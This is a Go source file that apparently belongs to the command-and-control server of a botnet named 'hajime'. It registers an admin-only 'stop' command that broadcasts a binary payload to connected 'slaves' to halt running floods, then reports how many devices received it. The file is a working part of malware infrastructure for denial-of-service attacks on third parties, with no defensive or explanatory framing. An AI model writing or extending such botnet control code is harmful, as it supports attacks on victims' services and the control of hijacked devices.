package commands

import (
	"encoding/binary"
	"hajime/source"
	"hajime/source/masters/sessions"
)

func init() {
	Register(&Command{
		Name:        "stop",
		Description: "stops any attacks",
		Admin:       true,
		Execute: func(session *sessions.Session, _ []string) error {
			payload := make([]byte, 4)
			binary.BigEndian.PutUint16(payload, 2)
			devices := source.Broadcast(append(payload, []byte(source.Options.String("server", "server.application", "server.application.slaves", "server.application.slaves.payload"))...), -1)

			return session.ExecuteBranding(map[string]any{"sent_too": devices}, "resources", "branding", "floods_stopped.tfx")
		},
	})
}